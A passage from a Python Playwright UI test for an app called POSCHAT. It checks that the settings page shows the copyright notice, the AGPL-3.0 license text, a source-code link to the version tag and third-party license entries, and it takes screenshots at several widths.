                    for want in ("POSCHAT", "Copyright © 2026 Beomjoon Kim", "GNU Affero General Public License v3.0 only"):
                        self.assertIn(want, text)
                    source = page.get_by_text("소스 코드 보기")
                    page.wait_for_function("document.querySelector('.license-block a.btn').href.includes('/tree/')")
                    self.assertTrue(source.get_attribute("href").endswith(f"/tree/v{APP_VERSION}"))
                    self.shot(page, f"license-settings-{width}")
                    page.get_by_text("라이선스 보기").click()
                    page.wait_for_selector(".license-text")
                    self.assertIn("GNU AFFERO GENERAL PUBLIC LICENSE", page.locator(".license-text").first.inner_text())
                    self.assertIn("AGPL-3.0-only", page.locator(".modal h2").last.inner_text())
                    self.shot(page, f"license-text-{width}")
                    page.locator(".modal-head .icon-btn").last.click()
                    page.get_by_text("제3자 라이선스", exact=True).first.click()
                    page.wait_for_selector("details summary")
                    names = page.locator("details summary").all_inner_texts()
                    self.assertIn("THIRD_PARTY_NOTICES.md", names)
                    self.assertIn("KaTeX-LICENSE.txt", names)
                    overflow = page.evaluate("Math.max(...[...document.querySelectorAll('.modal')].map(m => m.scrollWidth - m.clientWidth))")
                    self.assertLessEqual(overflow, 1)
                    self.shot(page, f"license-third-{width}")
                    self.assertEqual(errors, [])
                finally:
                    browser.close()


if __name__ == "__main__":
    unittest.main()
